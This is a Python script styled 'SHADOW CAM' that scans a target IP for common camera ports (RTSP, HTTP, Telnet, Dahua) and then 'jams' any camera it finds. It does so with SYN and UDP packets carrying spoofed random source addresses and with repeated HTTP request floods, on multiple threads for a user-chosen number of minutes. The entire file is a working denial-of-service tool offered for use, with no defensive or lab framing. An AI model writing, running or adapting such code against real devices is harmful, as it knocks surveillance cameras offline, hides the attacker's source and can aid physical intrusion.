#!/usr/bin/env python3
import pyfiglet, time, socket, os, sys, random, threading, ipaddress
from concurrent.futures import ThreadPoolExecutor
from scapy.all import IP, TCP, UDP, send, RandIP, RandShort

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RESET = "\033[0m"

TARGET_PORTS = [554, 80, 8080, 8554, 1935, 2020, 23, 81, 37777]
FAKE_IPS = [str(RandIP()) for _ in range(100)]
USER_AGENTS = [
    "Mozilla/5.0 (compatible; ShadowBot/1.0)",
    "Kali Linux PeTest Bot",
    "CamJammer/2.0"
]

def banner(text="SHADOW CAM 📷"):
    os.system("clear")
    for line in pyfiglet.figlet_format(text, font="standard").splitlines():
        print(RED + line + RESET)

def get_iface_ip(iface: str) -> str:
    try:
        import netifaces
        return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    except:
        print("[-] Install netifaces: pip install netifaces")
        sys.exit(1)

def tcp_scan(host: str, port: int) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.3)
            s.connect((host, port))
            return True
    except:
        return False

def knock(host: str, port: int):
    for _ in range(10):
        pkt = IP(dst=host, src=random.choice(FAKE_IPS)) / TCP(dport=port, sport=RandShort(), flags="S")
        send(pkt, verbose=0)
        pkt = IP(dst=host, src=random.choice(FAKE_IPS)) / UDP(dport=port, sport=RandShort())
        send(pkt, verbose=0)

def flood_http(host: str, port: int):
    try:
        import requests
        url = f"http://{host}:{port}/"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        for _ in range(20):
            try:
                requests.get(url, headers=headers, timeout=1)
            except:
                pass
    except ImportError:
        pass

def attack(host: str, port: int):
    if tcp_scan(host, port):
        print(f"{GREEN}[+] Camera found {host}:{port} – jamming...{RESET}")
        knock(host, port)
        flood_http(host, port)
        return 1
    return 0

def main():
    banner()
    iface = input("[?] Interface (e.g., wlan0): ").strip()
    src_ip = get_iface_ip(iface)
    target = input("[?] Target IP: ").strip()
    try:
        minutes = int(input("[?] Jam duration (minutes): "))
    except:
        print("[-] Invalid input.")
        sys.exit(1)

    end = time.time() + minutes * 60
    total = 0
    print(f"{YELLOW}[+] Starting jammer from {src_ip} → {target}{RESET}")

    while time.time() < end:
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(lambda p: attack(target, p), TARGET_PORTS))
        total += sum(results)
        print(f"{YELLOW}[+] Round complete. Total hits: {total}. Sleeping 10s...{RESET}")
        time.sleep(10)

    banner("DONE ✅")

if __name__ == "__main__":
    main()

